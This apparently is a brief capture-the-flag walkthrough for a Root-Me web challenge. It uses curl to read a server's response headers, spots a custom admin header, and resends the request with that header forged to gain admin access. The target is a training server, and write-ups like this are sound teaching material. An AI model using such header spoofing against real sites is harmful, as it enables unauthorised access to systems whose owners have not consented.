We need to look through headers.

Use linux tool curl.

curl -I http://challenge01.root-me.org/web-serveur/ch5/

Result ->  
HTTP/1.1 200 OK
Server: nginx
Date: Thu, 24 Aug 2017 09:11:23 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Vary: Accept-Encoding
Header-RootMe-Admin: none

Look at the header name Header-RootMe-Admin, it's value is set to none. We need to change it's value.

Use curl for this
curl -H "header-rootme-admin:123" http://challenge01.root-me.org/web-serveur/ch5/
